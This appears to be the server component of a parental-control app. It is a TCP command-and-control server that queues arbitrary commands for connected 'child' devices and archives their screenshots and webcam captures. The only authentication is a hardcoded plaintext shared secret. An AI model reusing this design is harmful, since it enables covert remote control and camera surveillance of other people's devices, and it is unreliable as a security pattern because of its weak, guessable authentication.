# =============================================================================
# ParentApp/bridge/server.dz — Master TCP Server & Real-time Session Pool
# Accepts Reverse Inbound Connections from Child Agents
# =============================================================================

use thread
use process
use file
use dir
use path
use json
use datetime
import "../core/config.dz" as config
import "../core/constants.dz" as constants

let PENDING_CMDS_FILE = "storage/pending_cmds.json"
let RESULTS_DIR = "storage/results"

fn ensureStorageDirs()
    try dir.createAll("storage/screenshots") catch e end
    try dir.createAll("storage/webcam") catch e end
    try dir.createAll("storage/cache") catch e end
    try dir.createAll(RESULTS_DIR) catch e end
end

ensureStorageDirs()

# Auto-detect local IP of Parent PC
fn detectParentLocalIp()
    try
        let out = process.exec("ipconfig")
        let text = str(out)
        if isMap(out) and out.has("stdout")
            text = out["stdout"]
        end
        let lines = text.split("\n")
        for line in lines
            if line.contains("IPv4") and line.contains(":")
                let parts = line.split(":")
                if parts.length() >= 2
                    let ip = parts[1].strip()
                    if ip.startsWith("192.168.") or ip.startsWith("10.") or ip.startsWith("172.")
                        return ip
                    end
                end
            end
        end
        return "127.0.0.1"
    catch e
        return "127.0.0.1"
    end
end

# Background Master TCP Server Runner Code
let BG_SERVER_SCRIPT = `
use net
use process
use file
use dir
use path
use json
use datetime

let MASTER_PORT = 9999
let SECRET_KEY = "KIDS_CTRL_2026"
let OFFLINE_TIMEOUT = 5.0
let DEVICES_FILE = "children.json"
let PENDING_CMDS_FILE = "storage/pending_cmds.json"
let RESULTS_DIR = "storage/results"

# Helpers for storage
fn getSsDir(deviceId)
    let d = "storage/screenshots/" + deviceId
    try dir.createAll(d) catch e end
    return d
end

fn getWcDir(deviceId)
    let d = "storage/webcam/" + deviceId
    try dir.createAll(d) catch e end
    return d
end

fn autoArchive(deviceId, rawData)
    if isNull(rawData) or type(rawData) != "String"
        return
    end

    let now = datetime.now()
    let ts = str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "_" + str(now.hour) + "-" + str(now.minute) + "-" + str(now.second)

    if rawData.startsWith("SCREENSHOT:")
        let b64 = rawData.substring(11).strip()
        if b64 != "" and !b64.startsWith("ERR:")
            let sDir = getSsDir(deviceId)
            let filePath = path.join(sDir, ts + ".b64")
            try file.write(filePath, b64) catch e end
        end
    elif rawData.startsWith("WEBCAM:")
        let b64 = rawData.substring(7).strip()
        if b64 != "" and b64 != "NO_WEBCAM" and !b64.startsWith("ERR:")
            let wDir = getWcDir(deviceId)
            let filePath = path.join(wDir, ts + ".b64")
            try file.write(filePath, b64) catch e end
        end
    end
end

# In-memory session tracking in server thread
let sessions = {}

# Load existing devices
try
    if file.isFile(DEVICES_FILE)
        let dData = file.read(DEVICES_FILE)
        let list = json.decode(dData)
        if type(list) == "Array"
            for d in list
                if type(d) == "Map" and d.has("id")
                    sessions[d["id"]] = d
                end
            end
        end
    end
catch e end

# Master TCP Server Instance
let srv = new net.tcpServer(fn(client, clientIp, clientPort)
    let raw = client.receiveAll()
    if isNull(raw) or raw == ""
        client.close()
        return
    end

    let req = Null
    try req = json.decode(raw) catch e client.close() return end
    if type(req) != "Map" or !req.has("id") or !req.has("secret")
        client.close()
        return
    end

    if req["secret"] != SECRET_KEY
        client.close()
        return
    end

    let devId = req["id"]
    let hostname = clientIp
    if req.has("hostname") and req["hostname"] != ""
        hostname = req["hostname"]
    end
    let reportedIp = clientIp
    if req.has("ip") and req["ip"] != ""
        reportedIp = req["ip"]
    end
    let nowTs = datetime.now().timestamp()

    # Update or create session
    if !sessions.has(devId)
        sessions[devId] = {
            "id": devId,
            "hostname": hostname,
            "custom_name": "",
            "ip": reportedIp,
            "is_online": True,
            "last_seen": nowTs
        }
    else
        let s = sessions[devId]
        s["hostname"] = hostname
        s["ip"] = reportedIp
        s["is_online"] = True
        s["last_seen"] = nowTs
    end

    # Sync sessions map to children.json
    try
        let listToSave = []
        for k in sessions.keys()
            listToSave.append(sessions[k])
        end
        file.write(DEVICES_FILE, json.encode(listToSave))
    catch e end

    # Handle returned command output
    if req.has("result_cmd_id") and req["result_cmd_id"] != ""
        let cId = req["result_cmd_id"]
        let resData = ""
        if req.has("result")
            resData = req["result"]
        end
        let resFile = path.join(RESULTS_DIR, cId + ".json")
        try file.write(resFile, json.encode({"data": resData})) catch e end
        autoArchive(devId, resData)
    end

    # Check for pending commands to dispatch to child
    let replyPayload = {"status": "OK", "action": "IDLE"}
    try
        if file.isFile(PENDING_CMDS_FILE)
            let pData = file.read(PENDING_CMDS_FILE)
            let pMap = json.decode(pData)
            if type(pMap) == "Map" and pMap.has(devId)
                let q = pMap[devId]
                if type(q) == "Array" and q.length() > 0
                    let nextCmd = q.pop(0)
                    replyPayload = {
                        "status": "OK",
                        "action": "EXEC",
                        "cmd_id": nextCmd["cmd_id"],
                        "command": nextCmd["command"]
                    }
                    file.write(PENDING_CMDS_FILE, json.encode(pMap))
                end
            end
        end
    catch e end

    client.send(json.encode(replyPayload))
    client.shutdown(net.SD_SEND)
    client.close()
end)

# Background liveness and disk sync thread
thread.spawnCode(\`
use process
use file
use json
use datetime

let DEVICES_FILE = "children.json"
let OFFLINE_TIMEOUT = 5.0

while True
    process.sleep(1.5)
    try
        if file.isFile(DEVICES_FILE)
            let data = file.read(DEVICES_FILE)
            let list = json.decode(data)
            if type(list) == "Array"
                let now = datetime.now().timestamp()
                let changed = False
                for d in list
                    if type(d) == "Map" and d.has("last_seen")
                        let isOnline = (now - d["last_seen"]) < OFFLINE_TIMEOUT
                        if d["is_online"] != isOnline
                            d["is_online"] = isOnline
                            changed = True
                        end
                    end
                end
                if changed
                    file.write(DEVICES_FILE, json.encode(list))
                end
            end
        end
    catch e end
end
\`)

try
    srv.listen(MASTER_PORT)
catch e end
`

# Registers all IPC handlers with ParentApp WebView
fn register(app)
    # Launch Master TCP Server in Background Thread
    thread.spawnCode(BG_SERVER_SCRIPT)

    # IPC: getLocalServerIp
    app.bridge.on("getLocalServerIp", fn(payload)
        return detectParentLocalIp()
    end)

    # IPC: loadDevices
    app.bridge.on("loadDevices", fn(payload)
        try
            if file.isFile(config.DEVICES_FILE)
                let data = file.read(config.DEVICES_FILE)
                let list = json.decode(data)
                if type(list) == "Array"
                    return list
                end
            end
            return []
        catch e
            return []
        end
    end)

    # IPC: saveDevices
    app.bridge.on("saveDevices", fn(payload)
        try
            let list = []
            if isArray(payload)
                list = payload
            else
                list = json.decode(str(payload))
            end
            if isArray(list)
                file.write(config.DEVICES_FILE, json.encode(list))
                return True
            end
            return False
        catch e
            return False
        end
    end)

    # IPC: scanNetwork (Instant Refresh from registry)
    app.bridge.on("scanNetwork", fn(payload)
        try
            if file.isFile(config.DEVICES_FILE)
                let data = file.read(config.DEVICES_FILE)
                let list = json.decode(data)
                if type(list) == "Array"
                    return list
                end
            end
            return []
        catch e
            return []
        end
    end)

    # IPC: agentCommand
    # Enqueues command in pending_cmds.json and waits for result file from reverse agent.
    app.bridge.on("agentCommand", fn(payload)
        try
            if type(payload) != "Map" or !payload.has("id") or !payload.has("command")
                return {"ok": False, "data": "Invalid request payload"}
            end

            let devId = payload["id"]
            let cmd = payload["command"]
            let now = datetime.now().timestamp()
            let cmdId = "CMD_" + str(now).replace(".", "") + "_" + str(math.floor(math.random() * 10000.0))

            # Read current pending commands map
            let pMap = {}
            try
                if file.isFile(PENDING_CMDS_FILE)
                    let pStr = file.read(PENDING_CMDS_FILE)
                    pMap = json.decode(pStr)
                end
            catch e end

            if !pMap.has(devId)
                pMap[devId] = []
            end

            pMap[devId].append({
                "cmd_id": cmdId,
                "command": cmd
            })

            file.write(PENDING_CMDS_FILE, json.encode(pMap))

            # Wait for response in storage/results/<cmdId>.json
            let resFile = path.join(RESULTS_DIR, cmdId + ".json")
            let maxWaitMs = 10000
            let waited = 0
            let startTime = datetime.now().timestamp()

            while waited < maxWaitMs
                if file.isFile(resFile)
                    let rContent = file.read(resFile)
                    try file.delete(resFile) catch e end
                    let resObj = json.decode(rContent)
                    let rData = ""
                    if type(resObj) == "Map" and resObj.has("data")
                        rData = resObj["data"]
                    end
                    let latency = math.floor((datetime.now().timestamp() - startTime) * 1000.0)
                    return {"ok": True, "data": rData, "latency": latency}
                end
                process.sleep(0.06)
                waited += 60
            end

            return {"ok": False, "data": "Command timed out waiting for child response."}
        catch e
            return {"ok": False, "data": "Internal error: " + str(e)}
        end
    end)
end
